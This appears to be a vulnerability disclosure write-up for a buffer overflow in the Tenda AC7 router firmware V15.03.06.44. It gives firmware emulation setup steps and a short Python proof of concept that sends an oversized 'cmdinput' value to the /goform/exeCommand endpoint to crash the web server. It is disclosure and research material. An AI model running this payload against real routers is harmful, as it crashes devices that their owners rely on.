Overview
--------

Experimental environment：ub20

Firmware download website：[AC7 V1.0 升级软件](https://www.tenda.com.cn/material/show/102776)
![image](https://github.com/user-attachments/assets/6c8f66b9-f107-4610-973f-d5f4365cfbd8)

### Environmental simulation

need build Network bridge:

```text-plain
apt install uml-utilities bridge-utils
brctl addbr br0
ifconfig br0 192.168.0.1/24
brctl addif br0 ens33//搭建网桥
```

Directly using the httpd in the original firmware will cause the simulation to fail due to the environment check. Here is the patched httpd file (a7\_\_V15.03.06.44\_httpd\_ok file in this project) (modify the assembly to force skip the environment check step): [https://github.com/Raining-101/IOT\_cve/blob/main/a7\_\_V15.03.06.44\_httpd\_ok](https://github.com/Raining-101/IOT_cve/blob/main/a7__V15.03.06.44_httpd_ok)

qemu command：

```text-plain
sudo qemu-mipsel-static -L . ./bin/httpd
```

Attacked version
----------------

V15.03.06.44

Vulnerability Details
----------------
A buffer overflow vulnerability exists in TenDa AC7 V15.03.06.44 firmware feature. This function copies the contents of the string to cmd_buf without performing a boundary check. Therefore, if the length is longer than 512 bytes, it can cause a buffer overflow, overwriting the memory area behind the array, which can cause the program to crash and trigger this security vulnerability.

![image](https://github.com/user-attachments/assets/ba19c8a1-732d-4dac-8258-6344af10f9b2)

### poc
```text-plain
import requests
ip = "192.168.142.100"
url = "http://" + ip + "/goform/exeCommand"
payload = b"Raining"*3000

data = {"cmdinput": payload}
response = requests.post(url, data=data)
print(response.text)
```
![image](https://github.com/user-attachments/assets/ac65ebbf-1756-40d5-82bb-5eb263070f8e)



